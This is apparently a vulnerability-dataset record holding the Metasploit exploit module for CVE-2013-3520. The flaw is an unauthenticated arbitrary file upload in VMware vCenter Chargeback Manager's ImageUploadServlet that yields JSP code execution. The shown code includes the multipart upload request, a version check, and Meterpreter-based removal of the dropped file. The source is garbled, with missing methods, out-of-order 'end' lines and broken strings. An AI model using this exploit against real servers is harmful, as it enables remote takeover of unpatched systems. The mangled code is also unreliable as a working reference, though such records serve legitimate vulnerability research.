{
    "text": "vul_name : VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload ， vul_cve : CVE-2013-3520 ， vul_poc :  ，  # This file is part of the Metasploit Framework and may be subject to ，  # redistribution and commercial restrictions. Please see the Metasploit ，  # web site for more information on licensing and terms of use. ， require 'msf/core' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， HttpFingerprint = { : pattern => [ /Apache. * Win32/ ] } ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'VMware vCenter Chargeback Manager ImageUploadServlet Arbitrary File Upload' ,  ， 'Description' => %q{ ， This module exploits a code execution flaw in VMware vCenter Chargeback Manager ,  ， where the ImageUploadServlet servlet allows unauthenticated file upload. The files ， are uploaded to the /cbmui/images/ web path , where JSP code execution is allowed. ， The module has been tested successfully on VMware vCenter Chargeback Manager 2.0.1 ， on Windows 2003 SP2. ， } ,  ， 'Author' => ，  [  ， 'Andrea Micalizzi' ,  # Vulnerability discovery ， 'juan vazquez' # Metasploit module ，  ]  ,  ， 'License' => MSF_LICENSE ,  ， ' ，  [  ，  [ 'CVE' , '2013-3520' ]  ,  ，  [ 'OSVDB' , '94188' ]  ,  ，  [ 'BID' , '60484' ]  ,  ，  [ 'URL' , ' ]  ，  ]  ,  ， 'Privileged' => true ,  ， 'Platform' => 'win' ,  ， 'Arch' => ARCH_X86 ,  ， 'Targets' => ，  [  ，  [ 'VMware vCenter Chargeback Manager 2.0.1 / Windows 2003 SP2' , { } ]  ，  ]  ,  ， 'DefaultOptions' => ， { ， 'SSL' => true ， } ,  ， 'DefaultTarget' => 0 ,  ， 'DisclosureDate' => 'May 15 2013' )  ， register_options (  ，  [  ， Opt : RPORT ( 443 )  ，  ]  , self.class )  ， end ，  # Try to find and delete the jsp if we get a meterpreter. ， end ， print_error ( \" # { @ peer} - Meterpreter not used. Please manually remove # { @ dropper}\" )  ， end ， cli.core.use ( \"stdapi\" ) if not cli.ext.aliases.include? ( \"stdapi\" )  ， begin ， print_status ( \" # { @ peer} - Searching :  # { @ dropper}\" )  ， files = cli.fs.file.search ( \"\\\" ,  @ dropper )  ， print_error ( \" # { @ peer} - Unable to find # { @ dropper}. Please manually remove it.\" )  ， end ， files.each { | f |  ， print_warning ( \"Deleting :  # {f [ 'path' ] + \"\\\" + f [ 'name' ] }\" )  ， cli.fs.file.rm ( f [ 'path' ] + \"\\\" + f [ 'name' ]  )  ， } ， print_good ( \" # { @ peer} - # { @ dropper} deleted\" )  ， rescue : Exception => e ， print_error ( \" # { @ peer} - Unable to delete # { @ dropper} :  # {e.message}\" )  ， end ， end ， post_data = Rex : MIME : Message.new ， post_data.add_part ( contents , \"image/png\" , nil , \"form-data ; name=\\\" # {rand_text_alpha ( 4+rand ( 4 ) }\\\" ; filename=\\\" # {filename}\\\" )  ，  # Work around an incompatible MIME implementation ， data = post_data.to_s ， data.gsub !  ( /\\r\\n\\r\\n-_Part/ , \"\\r\\n-_Part\" )  ， res = send_request_cgi (  ， { ， 'uri' => normalize_uri ( \"cbmui\" , \"ImageUploadServlet\" )  ,  ， 'method' => 'POST' ,  ， 'data' => data ,  ， 'ctype' => \"multipart/form-data ; boundary= # {post_data.bound}\" ,  ， 'cookie' => \"JSESSIONID= # { @ session}\" ， } )  ， end ， end ， def check ， res = send_request_cgi ( { ， 'uri' => normalize_uri ( \"cbmui\" , \"en_US\" , \"themes\" , \"excel\" , \"index.htm\" )  ,  ， } ) ",
    "time": "2013.07.23"
}